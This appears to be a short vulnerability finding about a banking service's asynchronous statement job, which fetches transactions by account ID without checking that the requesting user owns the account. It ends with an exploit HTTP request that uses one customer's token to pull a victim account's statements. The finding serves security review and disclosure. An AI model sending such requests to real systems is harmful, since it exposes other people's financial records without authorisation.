diagnosis: The StatementWorkerPool consumes asynchronous statement generation jobs dispatched from an API endpoint, but assumes the job payload was pre-validated. In the background goroutine, it fetches bank transactions by AccountID without verifying that RequestedByUser owns AccountID. An attacker submitting statement generation tasks can harvest financial transaction statements of victim bank accounts.
exploit_request:
POST /api/statements/async-generate HTTP/1.1
Host: ebanking.capital-bank.com
Authorization: Bearer customer_user_token_5
Content-Type: application/json

{"account_id": "acct_victim_9918", "month": 8, "year": 2026}
